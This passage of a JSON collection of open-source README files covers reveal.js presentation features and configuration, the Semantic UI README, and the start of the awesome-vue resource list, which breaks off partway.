b) (rfib b (+ a b)))) 0 1)))\n\t</code></pre>\n</section>\nLine Numbers & Highlights\nTo enable line numbers, add data-line-numbers to your <code> tags. If you want to highlight specific lines you can provide a comma separated list of line numbers using the same attribute. For example, in the following example lines 4 and 8-11 are highlighted:\n<pre><code class=\"hljs\" data-line-numbers=\"4,8-11\">\nimport React, { useState } from 'react';\n \nfunction Example() {\n  const [count, setCount] = useState(0);\n \n  return (\n    <div>\n      <p>You clicked {count} times</p>\n      <button onClick={() => setCount(count + 1)}>\n        Click me\n      </button>\n    </div>\n  );\n}\n</code></pre>\n\nSlide number\nIf you would like to display the page number of the current slide you can do so using the slideNumber and showSlideNumber configuration values.\n// Shows the slide number using default formatting\nReveal.configure({ slideNumber: true });\n\n// Slide number formatting can be configured using these variables:\n//  \"h.v\": \thorizontal . vertical slide number (default)\n//  \"h/v\": \thorizontal / vertical slide number\n//    \"c\": \tflattened slide number\n//  \"c/t\": \tflattened slide number / total slides\nReveal.configure({ slideNumber: 'c/t' });\n\n// You can provide a function to fully customize the number:\nReveal.configure({ slideNumber: function() {\n    // Ignore numbering of vertical slides\n    return [ Reveal.getIndices().h ];\n}});\n\n// Control which views the slide number displays on using the \"showSlideNumber\" value:\n//     \"all\": show on all views (default)\n// \"speaker\": only show slide numbers on speaker notes view\n//   \"print\": only show slide numbers when printing to PDF\nReveal.configure({ showSlideNumber: 'speaker' });\nOverview mode\nPress \u00bbESC\u00ab or \u00bbO\u00ab keys to toggle the overview mode on and off. While you're in this mode, you can still navigate between slides,\nas if you were at 1,000 feet above your presentation. The overview mode comes with a few API hooks:\nReveal.addEventListener( 'overviewshown', function( event ) { /* ... */ } );\nReveal.addEventListener( 'overviewhidden', function( event ) { /* ... */ } );\n\n// Toggle the overview mode programmatically\nReveal.toggleOverview();\nFullscreen mode\nJust press \u00bbF\u00ab on your keyboard to show your presentation in fullscreen mode. Press the \u00bbESC\u00ab key to exit fullscreen mode.\nEmbedded media\nAdd data-autoplay to your media element if you want it to automatically start playing when the slide is shown:\n<video data-autoplay src=\"http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4\"></video>\nIf you want to enable or disable autoplay globally, for all embedded media, you can use the autoPlayMedia configuration option. If you set this to true ALL media will autoplay regardless of individual data-autoplay attributes. If you initialize with autoPlayMedia: false NO media will autoplay.\nNote that embedded HTML5 <video>/<audio> and YouTube/Vimeo iframes are automatically paused when you navigate away from a slide. This can be disabled by decorating your element with a data-ignore attribute.\nEmbedded iframes\nreveal.js automatically pushes two post messages to embedded iframes. slide:start when the slide containing the iframe is made visible and slide:stop when it is hidden.\nStretching elements\nSometimes it's desirable to have an element, like an image or video, stretch to consume as much space as possible within a given slide. This can be done by adding the .stretch class to an element as seen below:\n<section>\n\t<h2>This video will use up the remaining space on the slide</h2>\n    <video class=\"stretch\" src=\"http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4\"></video>\n</section>\nLimitations:\n\nOnly direct descendants of a slide section can be stretched\nOnly one descendant per slide section can be stretched\n\nResize Event\nWhen reveal.js changes the scale of the slides it fires a resize event. You can subscribe to the event to resize your elements accordingly.\nReveal.addEventListener( 'resize', function( event ) {\n\t// event.scale, event.oldScale, event.size\n} );\npostMessage API\nThe framework has a built-in postMessage API that can be used when communicating with a presentation inside of another window. Here's an example showing how you'd make a reveal.js instance in the given window proceed to slide 2:\n<window>.postMessage( JSON.stringify({ method: 'slide', args: [ 2 ] }), '*' );\nWhen reveal.js runs inside of an iframe it can optionally bubble all of its events to the parent. Bubbled events are stringified JSON with three fields: namespace, eventName and state. Here's how you subscribe to them from the parent window:\nwindow.addEventListener( 'message', function( event ) {\n\tvar data = JSON.parse( event.data );\n\tif( data.namespace === 'reveal' && data.eventName ==='slidechanged' ) {\n\t\t// Slide changed, see data.state for slide number\n\t}\n} );\nThis cross-window messaging can be toggled on or off using configuration flags.\nReveal.initialize({\n\t// ...\n\n\t// Exposes the reveal.js API through window.postMessage\n\tpostMessage: true,\n\n\t// Dispatches all reveal.js events to the parent window through postMessage\n\tpostMessageEvents: false\n});\nPDF Export\nPresentations can be exported to PDF via a special print stylesheet. This feature requires that you use Google Chrome or Chromium and to be serving the presentation from a web server.\nHere's an example of an exported presentation that's been uploaded to SlideShare: http://www.slideshare.net/hakimel/revealjs-300.\nSeparate pages for fragments\nFragments are printed on separate slides by default. Meaning if you have a slide with three fragment steps, it will generate three separate slides where the fragments appear incrementally.\nIf you prefer printing all fragments in their visible states on the same slide you can set the pdfSeparateFragments config option to false.\nPage size\nExport dimensions are inferred from the configured presentation size. Slides that are too tall to fit within a single page will expand onto multiple pages. You can limit how many pages a slide may expand onto using the pdfMaxPagesPerSlide config option, for example Reveal.configure({ pdfMaxPagesPerSlide: 1 }) ensures that no slide ever grows to more than one printed page.\nPrint stylesheet\nTo enable the PDF print capability in your presentation, the special print stylesheet at /css/print/pdf.css must be loaded. The default index.html file handles this for you when print-pdf is included in the query string. If you're using a different HTML template, you can add this to your HEAD:\n<script>\n\tvar link = document.createElement( 'link' );\n\tlink.rel = 'stylesheet';\n\tlink.type = 'text/css';\n\tlink.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';\n\tdocument.getElementsByTagName( 'head' )[0].appendChild( link );\n</script>\nInstructions\n\nOpen your presentation with print-pdf included in the query string i.e. http://localhost:8000/?print-pdf. You can test this with revealjs.com?print-pdf.\n\n\nIf you want to include speaker notes in your export, you can append showNotes=true to the query string: http://localhost:8000/?print-pdf&showNotes=true\n\n\nOpen the in-browser print dialog (CTRL/CMD+P).\nChange the Destination setting to Save as PDF.\nChange the Layout to Landscape.\nChange the Margins to None.\nEnable the Background graphics option.\nClick Save.\n\n\nAlternatively you can use the decktape project.\nTheming\nThe framework comes with a few different themes included:\n\nblack: Black background, white text, blue links (default theme)\nwhite: White background, black text, blue links\nleague: Gray background, white text, blue links (default theme for reveal.js < 3.0.0)\nbeige: Beige background, dark text, brown links\nsky: Blue background, thin dark text, blue links\nnight: Black background, thick white text, orange links\nserif: Cappuccino background, gray text, brown links\nsimple: White background, black text, blue links\nsolarized: Cream-colored background, dark green text, blue links\n\nEach theme is available as a separate stylesheet. To change theme you will need to replace black below with your desired theme name in index.html:\n<link rel=\"stylesheet\" href=\"css/theme/black.css\" id=\"theme\">\nIf you want to add a theme of your own see the instructions here: /css/theme/README.md.\nSpeaker Notes\nreveal.js comes with a speaker notes plugin which can be used to present per-slide notes in a separate browser window. The notes window also gives you a preview of the next upcoming slide so it may be helpful even if you haven't written any notes. Press the \u00bbS\u00ab key on your keyboard to open the notes window.\nA speaker timer starts as soon as the speaker view is opened. You can reset it to 00:00:00 at any time by simply clicking/tapping on it.\nNotes are defined by appending an <aside> element to a slide as seen below. You can add the data-markdown attribute to the aside element if you prefer writing notes using Markdown.\nAlternatively you can add your notes in a data-notes attribute on the slide. Like <section data-notes=\"Something important\"></section>.\nWhen used locally, this feature requires that reveal.js runs from a local web server.\n<section>\n\t<h2>Some Slide</h2>\n\n\t<aside class=\"notes\">\n\t\tOh hey, these are some notes. They'll be hidden in your presentation, but you can see them if you open the speaker notes window (hit \u00bbS\u00ab on your keyboard).\n\t</aside>\n</section>\nIf you're using the external Markdown plugin, you can add notes with the help of a special delimiter:\n<section data-markdown=\"example.md\" data-separator=\"^\\n\\n\\n\" data-separator-vertical=\"^\\n\\n\" data-separator-notes=\"^Note:\"></section>\n\n# Title\n## Sub-title\n\nHere is some content...\n\nNote:\nThis will only display in the notes window.\nShare and Print Speaker Notes\nNotes are only visible to the speaker inside of the speaker view. If you wish to share your notes with others you can initialize reveal.js with the showNotes configuration value set to true. Notes will appear along the bottom of the presentations.\nWhen showNotes is enabled notes are also included when you export to PDF. By default, notes are printed in a box on top of the slide. If you'd rather print them on a separate page, after the slide, set showNotes: \"separate-page\".\nSpeaker notes clock and timers\nThe speaker notes window will also show:\n\nTime elapsed since the beginning of the presentation.  If you hover the mouse above this section, a timer reset button will appear.\nCurrent wall-clock time\n(Optionally) a pacing timer which indicates whether the current pace of the presentation is on track for the right timing (shown in green), and if not, whether the presenter should speed up (shown in red) or has the luxury of slowing down (blue).\n\nThe pacing timer can be enabled by configuring by the defaultTiming parameter in the Reveal configuration block, which specifies the number of seconds per slide.  120 can be a reasonable rule of thumb.  Timings can also be given per slide <section> by setting the data-timing attribute.  Both values are in numbers of seconds.\nServer Side Speaker Notes\nIn some cases it can be desirable to run notes on a separate device from the one you're presenting on. The Node.js-based notes plugin lets you do this using the same note definitions as its client side counterpart. Include the required scripts by adding the following dependencies:\nReveal.initialize({\n\t// ...\n\n\tdependencies: [\n\t\t{ src: 'socket.io/socket.io.js', async: true },\n\t\t{ src: 'plugin/notes-server/client.js', async: true }\n\t]\n});\nThen:\n\nInstall Node.js (4.0.0 or later)\nRun npm install\nRun node plugin/notes-server\n\nPlugins\nPlugins should register themselves with reveal.js by calling Reveal.registerPlugin( 'myPluginID', MyPlugin ). Registered plugin instances can optionally expose an \"init\" function that reveal.js will call to initialize them.\nWhen reveal.js is booted up via Reveal.initialize(), it will go through all registered plugins and invoke their \"init\" methods. If the \"init\" method returns a Promise, reveal.js will wait for that promise to be fullfilled before finshing the startup sequence and firing the ready event. Here's an example of a plugin that does some asynchronous work before reveal.js can proceed:\nlet MyPlugin = {\n\tinit: () =>  new Promise( resolve => setTimeout( resolve, 3000 ) )\n};\nReveal.registerPlugin( 'myPlugin', MyPlugin );\nReveal.addEventListener( 'ready', () => console.log( 'Three seconds later...' ) );\nReveal.initialize();\nIf the init method does not return a Promise, the plugin is considered ready right away and will not hold up the reveal.js startup sequence.\nRetrieving Plugins\nIf you want to check if a specific plugin is registered you can use the Reveal.hasPlugin method and pass in a plugin ID, for example: Reveal.hasPlugin( 'myPlugin' ). If you want to retrieve a plugin instance you can use Reveal.getPlugin( 'myPlugin' ).\nMultiplexing\nThe multiplex plugin allows your audience to view the slides of the presentation you are controlling on their own phone, tablet or laptop. As the master presentation navigates the slides, all client presentations will update in real time. See a demo at https://reveal-js-multiplex-ccjbegmaii.now.sh/.\nThe multiplex plugin needs the following 3 things to operate:\n\nMaster presentation that has control\nClient presentations that follow the master\nSocket.io server to broadcast events from the master to the clients\n\nMaster presentation\nServed from a static file server accessible (preferably) only to the presenter. This need only be on your (the presenter's) computer. (It's safer to run the master presentation from your own computer, so if the venue's Internet goes down it doesn't stop the show.) An example would be to execute the following commands in the directory of your master presentation:\n\nnpm install node-static\nstatic\n\nIf you want to use the speaker notes plugin with your master presentation then make sure you have the speaker notes plugin configured correctly along with the configuration shown below, then execute node plugin/notes-server in the directory of your master presentation. The configuration below will cause it to connect to the socket.io server as a master, as well as launch your speaker-notes/static-file server.\nYou can then access your master presentation at http://localhost:1947\nExample configuration:\nReveal.initialize({\n\t// other options...\n\n\tmultiplex: {\n\t\t// Example values. To generate your own, see the socket.io server instructions.\n\t\tsecret: '13652805320794272084', // Obtained from the socket.io server. Gives this (the master) control of the presentation\n\t\tid: '1ea875674b17ca76', // Obtained from socket.io server\n\t\turl: 'https://reveal-js-multiplex-ccjbegmaii.now.sh' // Location of socket.io server\n\t},\n\n\t// Don't forget to add the dependencies\n\tdependencies: [\n\t\t{ src: '//cdnjs.cloudflare.com/ajax/libs/socket.io/2.2.0/socket.io.js', async: true },\n\t\t{ src: 'plugin/multiplex/master.js', async: true },\n\n\t\t// and if you want speaker notes\n\t\t{ src: 'plugin/notes-server/client.js', async: true }\n\n\t\t// other dependencies...\n\t]\n});\nClient presentation\nServed from a publicly accessible static file server. Examples include: GitHub Pages, Amazon S3, Dreamhost, Akamai, etc. The more reliable, the better. Your audience can then access the client presentation via http://example.com/path/to/presentation/client/index.html, with the configuration below causing them to connect to the socket.io server as clients.\nExample configuration:\nReveal.initialize({\n\t// other options...\n\n\tmultiplex: {\n\t\t// Example values. To generate your own, see the socket.io server instructions.\n\t\tsecret: null, // null so the clients do not have control of the master presentation\n\t\tid: '1ea875674b17ca76', // id, obtained from socket.io server\n\t\turl: 'https://reveal-js-multiplex-ccjbegmaii.now.sh' // Location of socket.io server\n\t},\n\n\t// Don't forget to add the dependencies\n\tdependencies: [\n\t\t{ src: '//cdnjs.cloudflare.com/ajax/libs/socket.io/2.2.0/socket.io.js', async: true },\n\t\t{ src: 'plugin/multiplex/client.js', async: true }\n\n\t\t// other dependencies...\n\t]\n});\nSocket.io server\nServer that receives the slideChanged events from the master presentation and broadcasts them out to the connected client presentations. This needs to be publicly accessible. You can run your own socket.io server with the commands:\n\nnpm install\nnode plugin/multiplex\n\nOr you can use the socket.io server at https://reveal-js-multiplex-ccjbegmaii.now.sh/.\nYou'll need to generate a unique secret and token pair for your master and client presentations. To do so, visit http://example.com/token, where http://example.com is the location of your socket.io server. Or if you're going to use the socket.io server at https://reveal-js-multiplex-ccjbegmaii.now.sh/, visit https://reveal-js-multiplex-ccjbegmaii.now.sh/token.\nYou are very welcome to point your presentations at the Socket.io server running at https://reveal-js-multiplex-ccjbegmaii.now.sh/, but availability and stability are not guaranteed.\nFor anything mission critical I recommend you run your own server. The easiest way to do this is by installing now. With that installed, deploying your own Multiplex server is as easy running the following command from the reveal.js folder: now plugin/multiplex.\nsocket.io server as file static server\nThe socket.io server can play the role of static file server for your client presentation, as in the example at https://reveal-js-multiplex-ccjbegmaii.now.sh/. (Open https://reveal-js-multiplex-ccjbegmaii.now.sh/ in two browsers. Navigate through the slides on one, and the other will update to match.)\nExample configuration:\nReveal.initialize({\n\t// other options...\n\n\tmultiplex: {\n\t\t// Example values. To generate your own, see the socket.io server instructions.\n\t\tsecret: null, // null so the clients do not have control of the master presentation\n\t\tid: '1ea875674b17ca76', // id, obtained from socket.io server\n\t\turl: 'example.com:80' // Location of your socket.io server\n\t},\n\n\t// Don't forget to add the dependencies\n\tdependencies: [\n\t\t{ src: '//cdnjs.cloudflare.com/ajax/libs/socket.io/2.2.0/socket.io.js', async: true },\n\t\t{ src: 'plugin/multiplex/client.js', async: true }\n\n\t\t// other dependencies...\n\t]\nIt can also play the role of static file server for your master presentation and client presentations at the same time (as long as you don't want to use speaker notes). (Open https://reveal-js-multiplex-ccjbegmaii.now.sh/ in two browsers. Navigate through the slides on one, and the other will update to match. Navigate through the slides on the second, and the first will update to match.) This is probably not desirable, because you don't want your audience to mess with your slides while you're presenting. ;)\nExample configuration:\nReveal.initialize({\n\t// other options...\n\n\tmultiplex: {\n\t\t// Example values. To generate your own, see the socket.io server instructions.\n\t\tsecret: '13652805320794272084', // Obtained from the socket.io server. Gives this (the master) control of the presentation\n\t\tid: '1ea875674b17ca76', // Obtained from socket.io server\n\t\turl: 'example.com:80' // Location of your socket.io server\n\t},\n\n\t// Don't forget to add the dependencies\n\tdependencies: [\n\t\t{ src: '//cdnjs.cloudflare.com/ajax/libs/socket.io/2.2.0/socket.io.js', async: true },\n\t\t{ src: 'plugin/multiplex/master.js', async: true },\n\t\t{ src: 'plugin/multiplex/client.js', async: true }\n\n\t\t// other dependencies...\n\t]\n});\nMathJax\nIf you want to display math equations in your presentation you can easily do so by including this plugin. The plugin is a very thin wrapper around the MathJax library. To use it you'll need to include it as a reveal.js dependency, find our more about dependencies here.\nThe plugin defaults to using LaTeX but that can be adjusted through the math configuration object. Note that MathJax is loaded from a remote server. If you want to use it offline you'll need to download a copy of the library and adjust the mathjax configuration value.\nBelow is an example of how the plugin can be configured. If you don't intend to change these values you do not need to include the math config object at all.\nReveal.initialize({\n\t// other options ...\n\n\tmath: {\n\t\tmathjax: 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js',\n\t\tconfig: 'TeX-AMS_HTML-full'  // See http://docs.mathjax.org/en/latest/config-files.html\n\t\t// pass other options into `MathJax.Hub.Config()`\n\t\tTeX: { Macros: macros }\n\t},\n\n\tdependencies: [\n\t\t{ src: 'plugin/math/math.js', async: true }\n\t]\n});\nRead MathJax's documentation if you need HTTPS delivery or serving of specific versions for stability.\nMathJax in Markdown\nIf you want to include math inside of a presentation written in Markdown you need to wrap the formula in backticks. This prevents syntax conflicts between LaTeX and Markdown. For example:\n`$$ J(\\theta_0,\\theta_1) = \\sum_{i=0} $$`\n\nLicense\nMIT licensed\nCopyright (C) 2019 Hakim El Hattab, http://hakim.se"}, {"title": "Semantic-Org/Semantic-UI", "language": "JavaScript", "content": "Semantic UI\n\n\nSemantic is a UI framework designed for theming.\nKey Features\n\n50+ UI elements\n3000 + CSS variables\n3 Levels of variable inheritance (similar to SublimeText)\nBuilt with EM values for responsive design\nFlexbox friendly\n\nSemantic allows developers to build beautiful websites fast, with concise HTML, intuitive javascript, and simplified debugging, helping make front-end development a delightful experience. Semantic is responsively designed allowing your website to scale on multiple devices. Semantic is production ready and partnered with frameworks such as React, Angular, Meteor, and Ember, which means you can integrate it with any of these frameworks to organize your UI layer alongside your application logic.\n2.4.0 Release (Sep 17th, 2018)\nSemantic UI 2.4 is now available. Read up on what's new in the docs.\nMigration info from 1.x can be found in the 2.0 release notes\nUser Support\nPlease help us keep the issue tracker organized. For technical questions that do not include a specific JSFiddle test case (bug reports), or feature request please use StackOverflow to find a solution.\nVisit our contributing guide for more on what should be posted to GitHub Issues.\nInstall\nRecommended Install\nnpm install semantic-ui  # Use themes, import build/watch tasks into your own gulpfile.\nSemantic UI includes an interactive installer to help setup your project.\n\nFor more details on setup visit our getting started guide.\nTo learn more about theming please read our theming guide\n\nAdditional Versions\n\n\n\nEnvironment\nInstall Script\nRepo\n\n\n\n\nCSS Only\nnpm install semantic-ui-css\nCSS Repo\n\n\nLESS Only\nnpm install semantic-ui-less\nLESS Repo\n\n\nLESS plugin\nnpm install less-plugin-semantic-ui\nLESS Plugin Repo\n\n\nEmberJS\nember install:addon semantic-ui-ember\nEmber Repo\n\n\nMeteor - LESS\nmeteor add semantic:ui\nMeteor Repo\n\n\nMeteor - CSS\nmeteor add semantic:ui-css\nCSS Repo\n\n\nBower\nbower install semantic-ui\n\n\n\n\nCheck out our integration wiki for more options.\nBrowser Support\n\nLast 2 Versions FF, Chrome, Safari Mac\nIE 11+\nAndroid 4.4+, Chrome for Android 44+\niOS Safari 7+\nMicrosoft Edge 12+\n\nAlthough some components will work in IE9, grids and other flexbox components are not supported by IE9 and may not appear correctly.\nCommunity\nGetting Help\nPlease do not post usage questions to GitHub Issues. For these types of questions use our [Gitter chatroom] or StackOverflow.\nSubmitting Bugs and Enhancements\nGitHub Issues is for suggesting enhancements and reporting bugs. Before submiting a bug make sure you do the following:\n\nCheck out our contributing guide for info on our release cycle.\nFork this boilerplate JSFiddle to create a test case for your bug. If a bug is apparent in the docs, that's ok as a test case, just make it clear exactly how to reproduce the issue. Only bugs that include a test case can be triaged.\n\nPull Requests\nWhen adding pull requests, be sure to merge into the next branch. If you need to demonstrate a fix in next release, you can use this JSFiddle\nInternational\n\nChinese A Chinese mirror site is available at http://www.semantic-ui.cn.\nRight-to-Left (RTL) An RTL version can be created using our build tools by selecting rtl from the install script.\nTranslation To help translate see the Wiki Guide for translations.\n\nResources\n\n\n\nResource\nDescription\n\n\n\n\nBugs & Feature Requests\nAll bug submission require a link to a test case, and a set of steps to reproduce the issue. You can make a test case by forking this JSFiddle, then submit your bug report on GitHub Issues\n\n\nLive Chat\nJoin our Gitter.im Room\n\n\nNewsletter Updates\nSign up for updates at semantic-ui.com\n\n\nAdditional Resources\nSubmit a question on StackOverflow or ask our Google Group\n\n\n\nPlaces to Help\n\n\n\nProject\nHow To Help\nNext Step\n\n\n\n\nLocalization\nHelp us translate Semantic UI into your language\nJoin our Translation Community\n\n\nSCSS\nSASS needs PR to support variables inside @import\nAdd Pull Request for #739\n\n\nAngular\nHelp develop angular bindings\nReach Out on GitHub Issues\n\n\nGuides & Tutorials\nHelp write guides and tutorials\nJoin the discussion\n\n\n\nReaching Out\nIf you'd like to start a conversation about Semantic feel free to e-mail me at jack@semantic-ui.com"}, {"title": "vuejs/awesome-vue", "language": "JavaScript", "content": "Awesome Vue.js \n\nA curated list of awesome things related to Vue.js\n\n\nResources\n\nOfficial Resources\nExternal Resources\nJob Portal\nCommunity\nConferences\nPodcasts\nYoutube Channels\nOfficial Examples\nTutorials\nExamples\nBooks\nBlog Posts\n\n\nProjects Using Vue.js\n\nOpen Source\nCommercial Products\nApps/Websites\nInteractive Experiences\nEnterprise Usage\nA11y\n\n\nComponents & Libraries\n\nUI Components\n\n\nTable\n\n\nNotification\n\n\nLoader\n\nProgress Bar\n\n\n\nTooltip\n\n\nOverlay\n\n\nParallax\n\n\nIcons\n\n\nMenu\n\n\nMinus Plus Input\n\n\nCarousel\n\n\nCharts\n\n\nTime\n\n\nCalendar\n\n\nMap\n\n\nAudio / Video\n\n\nInfinite Scroll\n\n\nPull-to-refresh\n\n\nMarkdown\n\n\nPDF\n\n\nTree\n\n\nSocial Sharing\n\n\nQR Code\n\n\nSearch\n\n\nMiscellaneous\n\n\nTabs\n\n\nForm\n\nPhone Number Input\nPicker\nGenerator\n\nDate Picker\n\n\nSelect\nSlider\nDrag and Drop\nAutocomplete\nType Select\nColor Picker\nSwitch\nMasked Input\nRich Text Editing\nImage Manipulation\nVideo Manipulation\nFile Upload\nContext Menu\nMiscellaneous\nWizard\nCSV\nComment System\n\n\n\nCanvas\n\n\nLink Preview\n\n\nTour\n\n\n\nUI Layout\nFrameworks\n\nResponsive\nMobile\nComponent Collections\nAdmin Template\nServer-side rendering\nStatic website generator\nOther\n\n\nUI Utilities\n\nEvent Handling\nResponsive Design\nForm\n\nValidation\n\n\nResize\nScroll\nRouting\nLazy Load\nPagination\nAnimation\nMeta Tags\nPortal\nFilters\nSVG\nMiscellaneous\nWebGL\nFullscreen\nPage visibility\nPrinting\n\n\nUtilities\n\nTypescript\nHTTP Requests\ni18n\nCustom Events\nPersistence\nState Management\n\nRedux\nMobx\nAuthentication/Authorization\nVuex Utilities\n\nSync Between Tabs\n\n\n\n\nGraphQL\nConcurrency Management\nCode Style\nCSS\nAsset Management\nPage Navigation\nMiscellaneous\nWeb Workers\nJSX\nMigration\nWeb Sockets\nPayment\n- Stripe\n- Paypal\n- Plaid\n\n\nIntegrations\n\nVue CLI 3 Plugins\n- Google Analytics\n- Yandex Metrika\n\n\nDev Tools\n\nInspect\nDocs\nTest\n- Browser-less require\nSource Code Editing\n\nAtom\nSublime Text\nVim\nVisual Studio Code\nVisual Studio\nBrackets\nIntellij\nEmacs\nKate\n\n\n\n\nScaffold\n\nClient\nUniversal\nServer\nElectron\nParts\n\n\nRuntime\n\nCommand Line / Terminal\n\n\nPrerendering\n\n\n\nResources\nOfficial Resources\n\nOfficial Guide\nAPI Reference\nGitHub Repo\nRelease Notes\nStyle Guide\nVue.js News\n\nExternal Resources\n\nVue.js\u8cc7\u6599\u307e\u3068\u3081(for japanese) by @hashrock\nVue.js Newsletter - Weekly dose of handpicked Vue.js news\nVue.js Tips - Tips to become a better Vue.js developer\nVue.js Wikipedia\nVue.js Radar - Curated newsletter + site covering new Vue.js releases/contributions.\nVue News - Social website focusing on the latest Vue.js news and information.\nVue Curated Resources - Recommended Vue.js courses and tutorials.\nBuiltForVue - NPM Mirror of all Vue.js components and packages.\nVue School - Learn Vue.js from video courses by core members and industry experts\nVueDose. Tips & tricks about the Vue ecosystem, for busy devs.\nVuelibs. A minimalistic list of Vue.js libraries and components based on the awesome-vue repo.\n\nJob Portal\n\nVue.js Jobs - VueJobs - A Vue.js job portal to hire or get hired for all your Vue.js jobs.\nVue.js Interview Questions - A List of 300 VueJS Interview Questions and Answers\n\nCommunity\n\nTwitter\nOfficial Forum\nvue-requests - Request a Vue.js module you wish existed or get ideas for modules\nVueJS Iran - Telegram Channel & group (group link available in channel bio)\nvueslack - 2300+ registered users worldwide\nVue Land - Discord chat server\nVueJS Russia - Telegram Group [Russian]\nVueJS Viet Nam - Facebook group\nVueJS Spanish - Slack Group\nVueJS Korean - Slack Group\nVueJS Thailand - Facebook Group\nVueJS Brasil - Telegram Group [Portuguese]\nVueJS Brasil - Facebook Page [Portuguese]\nVueJS Brasil - Facebook Group [Portuguese]\nVueJS en espa\u00f1ol - Facebook Group [Spanish]\nVueJS India \ud83c\uddee\ud83c\uddf3  - Discord chat server\nVueJS Indonesia - Telegram Group [Indonesian]\nVueJS Hong Kong - Facebook group\nVueJS Arab - Telegram Group\nVueJS Vix - Telegram Group [Portuguese]\nVueJS Vix - Meetup Page [Portuguese]\nVueJS Norway - Meetup\nVueJS Israel \ud83c\uddee\ud83c\uddf1 - Facebook Page\n\nConferences\n\nVueConf\nVue.js London\nVueConf US\n\nPodcasts\n\nFull Stack Radio #30 (11-23-2015)\nJavaScript Jabber #187 (11-25-2015)\nChangelog #184 (11-27-2015)\nSoftware Engineering Daily (12-29-2015)\nJavaScript Air 016 (03-30-2016)\nCodecasts #2 - Falando Sobre Vuejs e Web Components (2016-08-19) [pt-BR]\nFull Stack Radio #50 (09-21-2016)\n\u548c Vue.js \u6846\u67b6\u7684\u4f5c\u8005\u804a\u804a\u524d\u7aef\u6846\u67b6\u5f00\u53d1\u80cc\u540e\u7684\u6545\u4e8b [zh-CN]\nMW S04E08 - Vue.js with Evan You and Sarah Drasner (04-27-2017)\nRequest For Commits #12 - Crowdfunding Open Source (Vue.js) (06-15-2017)\nThe Web Platform Podcast 132: Vue.js (07-27-2017)\nJavaScript Jabber #276 with Maximilian Schwarzm\u00fcller (08-29-2017)\nAnimating VueJS with Sarah Drasner(Software Engineering Daily 01-12-2017)\nViews on Vue (weekly podcast on Vue started 03-06-2018)\nThe Official Vue.js News Podcast\nVue podcast list via The QIT Tech Podcast Indexer\nDNE 138 - Vale a pena VueJS? (01-05-2018)\nCynical Developer #99 (10-15-2018)\nSyntax #130 (03-27-2019)\n\nYoutube Channels\n\nVueNYC\nVueConf EU\n\nOfficial Examples\n\nBasic Examples\nVue.js TodoMVC\nCoffeeScript Version\nVue.js HackerNews Clone\nVue.js 2.0 HackerNews Clone\n\nTutorials\n\nVue.js screencasts on Laracasts\nVuejs 2 Authentication Tutorial on Auth0 blog\nCreate a GitHub File Explorer Using Vue.js on Scotch.io\nVue.js Tutorial on Vegibit\nVue.js build set-up from scratch with webpack, vue-loader and hot reload\nVuex basics: Tutorial and explanation\nVuex introduction video - James Browne from London Vue.js Meetup #1\nVue.js \u4e2d\u6587\u7cfb\u5217\u89c6\u9891\u6559\u7a0b on Laravist\nDevelop a Reactive Invoice App using Vue.js on craigmckenna.com\nHybrid App Example with Laravel and Vue.js in Portuguese by @vedovelli\nVue.js Introduction Turkish Language on oguzhan.in\nVue.js VideoTutoral Series in Spanish (3-8-2016) on YouTube by Juan Andr\u00e9s N\u00fa\u00f1ez\nVue.js Screencast Series in Spanish on Styde.net\n\u8bb2\u89e3Vue.js \u5b98\u7f51 \u4e2d\u6587-\u542b\u4ee3\u7801\u3001\u767e\u5ea6\u4e91\u3001youtube on bhnddowinf\nExploring Real Time Apps with VueJS, ES2015 and Webpack on Pusher\nVue.js in Bahasa Indonesia on sekolahkoding.com\nVue.js from Scratch Series in Russian on YouTube by .dev\n\u0421\u0442\u0432\u043e\u0440\u0435\u043d\u043d\u044f \u0441\u0435\u0440\u0432\u0456\u0441\u0443 \u0434\u043b\u044f \u0437\u0431\u0435\u0440\u0456\u0433\u0430\u043d\u043d\u044f \u0444\u0430\u0439\u043b\u0456\u0432 \u0437 Flask, RethinkDB \u0442\u0430 Vue.js, \u0447. 1 Ukraine\nVueJS 2 French tutorial Fran\u00e7ais par Grafikart\nJayway Vue.js 2 workshop. Build an e-commerce site with vue-router, vuex and vue-resource\nHow to Create Great VueJS Applications Using Wijmo Controls\n\u8bb2\u89e3Vue.js 2 \u5b98\u7f51 \u4e2d\u6587-\u542b\u4ee3\u7801\u3001\u767e\u5ea6\u4e91\u3001youtube on bhnddowinf\nVue.js Cheatsheet: Server-side Applications, Router, Vuex Store, GraphQL and more by @xpepermint\nMedium like Image Loading with Vue.js\nHow to Use Vuex in a Laravel Spark Project on Metric Loop\nHow To Set Up Modules in Vuex on Metric Loop\nLearn Vue 2: Step By Step on Laracasts\nVue.js \u4e2d\u6587\u6559\u7a0b\nUp and Running with the Vue.js 2.0 Framework on SitePoint\nHow to make API Calls with Vuex on Metric Loop\nHow to Use Vuex to Build a Feature on Metric Loop\nVue.js 2.0 Fundamentals on YouTube by DevMarketer\nVuex For The Clueless\u200a\u2014\u200aThe Missing Primer On Vue\u2019s Application Data Store\nReal-time Grid Component Laravel, Vue.js, Vuex & Socket.io\nVueJS 2 - The Complete Guide (incl. Vuex) - Udemy Tutorial\nDevelop Web Apps with Vue.js on egghead.io\nVue.js 2 - Getting Started\nVue.js 2 & Vuex (Basics)\nT\u00fcrk\u00e7e VueJS E\u011fitim Videolar\u0131 on YouTube by Fatih Acet\nBuilding a JSON Tree View Component in Vue.js from Scratch in Six Steps on digimondo devblog by Arvid Kahl\nLet's Vue! - OpenLecture 2017.01 in Russian on YouTube by Illya Klymov (@xanf)\nBootstrapping your first Vue.js application using vue-cli by @afropolymath\nBuild vue-hackernews-2.0 from Scratch by @ Detachment\nRole Based Authorization for your Vue.js and Nuxt.js Applications Using vue-kindergarten\nComplete Vue.js Application Tutorial - Creating a Simple Budgeting App with Vue by @matthiaswh\nVue.js Tutorial: A Prerendered, SEO-Friendly Example\nVue.js Introduction For People Who Know Just Enough jQuery To Get By\nFetching Data from a Third-Party API with Vue.js and Axios\nFun Projects with Vue 2 (Video) by Peter van Meijgaard, Packt. (April 2017)\nVue JS: Simultaneously Running Express and Webpack Dev Server on Medium by Henrik Fogelberg\nVue JS 2 Tutorials on Youtube by The Net Ninja\nAdd a headless CMS to VueJs in 5 Minutes\nvue \u67b6\u6784\u4e2d\u7684 Watcher\nBuilding Your First App With Vue.js\n5 Practical 